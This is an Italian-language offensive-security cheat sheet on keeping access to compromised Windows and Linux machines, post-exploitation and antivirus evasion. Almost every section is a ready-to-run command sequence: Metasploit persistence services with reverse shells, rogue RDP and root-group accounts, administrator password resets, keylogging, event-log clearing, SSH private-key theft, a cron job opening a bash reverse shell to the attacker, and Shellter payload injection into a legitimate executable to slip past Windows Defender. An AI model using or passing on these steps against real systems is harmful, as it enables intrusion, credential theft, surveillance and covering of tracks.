---
hidden: true
---

# ♾️ Persist, obfusc, clean

## <mark style="color:$primary;">Persistence on Windows</mark>

### <mark style="color:$primary;">Persistence via new Service</mark>

Per sopravvivere a restart, cambio di credenziali e altre interruzioni.

```shell
service postgresql start && msfconsole -q
#Fai exploit della victim
#Fai privesc sulla victim
#Ora lavora su meterpreter per rimanere persistente
use exploit/windows/local/persistence_service                  #Crea un servizio persistente nella victim
    set payload windows/x64/meterpreter/reverse_tcp
    set SESSION <NUMBER>                                       
    run
#Se errore: "Only support for windows meterpreter/shell reverse staged payload" allora cambia payload
    set payload windows/meterpreter/reverse_tcp
    run
```

Ora dovresti avere meterpreter

{% code title="meterpreter - kali" %}
```shell
getuid
exit
```
{% endcode %}

Ora se anche killi la sessione con multi/handler puoi riaprirla

{% code title="msf - kali" %}
```shell
use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST eth1
    set PORT <PORT>                                             #Se non hai cambiato la porta di prima va bene quella di default
    run
```
{% endcode %}

Da ora se chiudi la sessione o addirittura msfconsole ti basta lanciare multi/handler per ricollegarti alla victim.

***

### <mark style="color:$primary;">Persistence via RDP</mark>

Attiva RDP (SOLO windows) che di default su Windows è disabilitato

{% code title="meterpreter" %}
```shell
#Fai exploit della victim
#Fai privesc della victim

#Crea un nuovo account con la psw che vuoi sulla victim per RDP
run getgui -e -u davide -p password
exit
```
{% endcode %}

Ora nel servizio RDP della victim c'è un nuovo account.

Accedi a RDP da kali

{% code title="me - kali" %}
```shell
xfreerdp /u:davide /p:password /v:<IP_TARGET>
```
{% endcode %}

Ora dalla GUI fai ciò che vuoi e se vuoi usa il terminale.

***

## <mark style="color:$primary;">Post-Exploit on Windows</mark>

### <mark style="color:$primary;">Attiva RDP (solo Windows)</mark>

Attiva RDP che di default su Windows è disabilitato

```shell
#Fai exploit della victim
#Fai privesc della victim

#Ora lavora su meterpreter per attivare RDP
use post/windows/manage/enable_rdp
    set SESSION <NUMBER>                                         #Porta di default RDP
    run
```

Ora il servizio RDP è aperto sulla victim.

Apri la sessione di prima

{% code title="msf" %}
```shell
sessions <NUMBER>
```
{% endcode %}

{% code title="meterpreter" %}
```shell
shell
    net users 
    #Cambia la psw dell'admin e mettila "psw" così è semplice
    net user administrator psw                        
    CTRL+C y
```
{% endcode %}

Accedi a RDP da kali

{% code title="me - kali" %}
```shell
xfreerdp /u:administrator /p:psw /v:<IP_TARGET>
```
{% endcode %}

***

### <mark style="color:$primary;">Keylogging (solo Windows)</mark>

{% code title="meterpreter" %}
```shell
#Fai exploit della victim
#Fai privesc della victim

pgrep explorer
migrate <PID_EXPLORER>
keyscan_start
#Qualsiasi cosa verrà scritta dalla victim puoi leggerla tramite cmd sotto
keyscan_dump
keyscan_stop
```
{% endcode %}

***

### <mark style="color:$primary;">Clear Event Logs (su Windows)</mark>

{% code title="meterpreter" %}
```shell
#Fai exploit della victim
#Fai privesc della victim
clearev       
```
{% endcode %}

OPPURE

Per fare resource cleanup puoi usare uno script di Meterpreter

```shell
resource cleanup.rc
```

***

***

## <mark style="color:$primary;">Post-Exploit on Linux</mark>

{% code title="Moduli disponibili" %}
```shell
service postgresql start && msfconsole -q
#Fai exploit della victim

post/linux/gather/enum_users_history                       #Leggi user bash history
post/linux/gather/enum_configs                             #Trova tutti i file di config di linux nella victim
post/multi/gather/env                                      #Leggi i settingd di linux nella victim
post/linux/gather/enum_network                             #Trova network info 
post/linux/gather/enum_protection                          #Trova meccanismi di hardening utilizzati (SMEP, SMAP, SELinux, PaX e grsecurity)
post/linux/gather/enum_system                              #Trova system info (user list, user bash history, cronjobs, servizi e packages installati)
post/linux/gather/checkcontainer                           #Trova se ci sono container (e.g. Docker)
post/linux/gather/checkvm                                  #Trova se ci sono vm
loot                                            #MOSTRA INFORMAZIONI RICEVUTE DAL POST EXPLOIT ENUM
```
{% endcode %}

{% code title="Meterpreter session" %}
```shell
service postgresql start && msfconsole -q
#Fai exploit della victim

ifconfig                                                    #Leggi config di rete, cerca reti interne
#OPPURE
ip a s                                                      #Leggi config di rete, cerca reti interne
netstat -antp                                               #Leggi porte aperte
ps aux                                                      #Leggi processi
env                                                         #Trova tutti i path possibili per quell'user
```
{% endcode %}

***

## <mark style="color:$primary;">Persistence on Linux</mark>

### <mark style="color:$primary;">Persistence via new Service</mark>

Per sopravvivere a restart, cambio di credenziali e altre interruzioni.

```shell
service postgresql start && msfconsole -q
#Fai exploit della victim
#Fai privesc sulla victim
#Ora lavora su meterpreter per rimanere persistente
shell 
    useradd -m <NAME> -s /bin/bash
    passwd <NAME>
    groups root
    #Leggi il gruppo di root e poi aggiungici il tuo nuovo user
    usermod -aG root <NAME>
    groups <NAME>
    usermod -u 15 <NAME>
CTRL+C y
```

```shellscript
use exploit/linux/local/cron_persistence                  #Crea un servizio persistente nella victim
    set SESSION <NUMBER>                                       
    run
#OPPURE
use exploit/linux/local/service_persistence
    set SESSION <NUMBER>   
    set payload cmd/unix/reverse_python                   #FORSE
    run

use post/linux/manage/sshkey_persistence
    set SESSION <NUMBER>   
    set CREATESSHFOLDER true
    run
loot
    
    
#Se errore: "Only support for windows meterpreter/shell reverse staged payload" allora cambia payload
    set payload windows/meterpreter/reverse_tcp
    run
```

Ora dovresti avere meterpreter

{% code title="meterpreter" %}
```shell
getuid
exit
```
{% endcode %}

Ora se anche killi la sessione con multi/handler puoi riaprirla

```shell
use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST eth1
    set PORT <PORT>                                             #Se non hai cambiato la porta di prima va bene quella di default
    run
```

Da ora se chiudi la sessione o addirittura msfconsole ti basta lanciare multi/handler per ricollegarti alla victim.

***

### <mark style="color:$primary;">Persistence via SSH Keys</mark>

Su Linux spesso ci sono server o db che devono essere raggiungibili via SSH.

```shell
#Fai exploit della victim
#Fai privesc della victim

#Fai accesso ad user_compromesso con SSH (user@psw)
ssh <USER_COMPROMESSO>@<IP>
    ls -al 
    cd .ssh/
    cat id_rsa                                                    #Leggi la private key SSH dell'user
    exit
scp <USER_COMPROMESSO>@<IP>:~/.ssh/id_rsa .
ls -al                                                            #Check che hai fatto il download
chmod 400 id_rsa
```

Fai login all'user compromesso tramite la SSH Key.

```shell
ssh -i id_rsa <USER_COMPROMESSO>@<IP>
```

***

### <mark style="color:$primary;">Persistence via Cron Jobs</mark>

{% code title="Victim <USER>" %}
```shell
#Crea un CronJob
echo "* * * * * /bin/bash -c 'bash  -i >& /dev/tcp/<IP_ATTACKER>/<PORT_ATTACKER_NC> 0>&1'" > cron
cat cron
crontab -i cron
crontab -l   
```
{% endcode %}

{% code title="msf - kali" %}
```shell
nc -nvlp <PORT>
#Aspetta solo che venga eseguito il cron su victim
```
{% endcode %}

***

## <mark style="color:$primary;">**Obfuscation**</mark>

### <mark style="color:$primary;">**AV Evasion - Shellter**</mark>

{% hint style="info" %}
Gli AV effettuano detection basata su:

* SIGNATURE detection
* BEHAVIOUR detection
* HEURISTIC detection
{% endhint %}

{% hint style="warning" %}
Solo applicationi 32-bit
{% endhint %}

{% columns %}
{% column %}
On-disk evasion techniques:

* Obfuscation
* Encoding
* Packing
* Crypting
{% endcolumn %}

{% column %}
In-memory evasion techniques:

* Non scrivere file su disk
* Payload injected in processo
* Payload eseguito in memoria in un altro thread&#x20;
{% endcolumn %}
{% endcolumns %}

Usa shellter per inject codice powershell in un PE (portable executable).

```shell
sudo apt-get install shellter -y
sudo dpkg --add-architecture i386
sudo apt-get install wine32
cd /usr/share/windows-resources/shellter
#Copia vncviewer.exe da /usr/share/windows-binaries a /home/kali/Desktop/AVBypass/
sudo wine shellter.exe
    A
    /home/kali/Desktop/AVBypass/vncviewer.exe                 #PE target
    y                                                         #Enable stealth mode
    L                                                         #Listed payload
    1                                                         #Number 1
    <IP>
    <PORT>
    ENTER
msfconsole -q
```

Apri altro terminale

```shell
cd ~/Desktop/AVBypass
sudo python3 -m http.server 80
```

Torna al terminale di prima

```shell
use multi/handler 
    set payload windows/meterpreter/reverse_tcp
    set LHOST <IP_ATTACKER>
    set LPORT <PORT>
    run
```

Dalla vittima vai su broswer http://\<IP>/

Prova a scaricare l'exe.

Se riesci a fare download hai fregato Windows Defender.

Ora da terminale avrai una shell meterpreter funzionante.

***

### <mark style="color:$primary;">Obfuscation - Invoke-Obfuscation</mark>

```shell
sudo apt-get install powershell -y
pwsh
    #Ora hai una sessione powershell su linux
    cd ./Invoke-Obfuscation/
    dir
    Import-Module ./Invoke-Obfuscation.ps.pds1
    cd ..
    Invoke-Obfuscation
#Continuo lungo... cercalo se serve
```





***

***





















